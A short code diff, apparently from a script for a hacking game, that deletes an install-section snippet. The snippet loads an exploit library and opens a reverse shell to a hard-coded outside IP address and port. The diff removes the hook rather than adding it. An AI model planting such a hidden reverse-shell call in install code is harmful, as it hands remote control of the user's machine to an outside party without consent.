@@ -707,9 +707,3 @@ end if
 //////////////////////////////////////////////////////////////  
 ///====================== INSTALL ========================///
 ////////////////////////////////////////////////////////////
-
-
-mx = include_lib("/lib/metaxploit.so")
-if not mx then mx = include_lib("/home/fsociety/metaxploit.so")
-if not mx then exit
-mx.rshell_client("187.131.127.11", 1222, "csession")
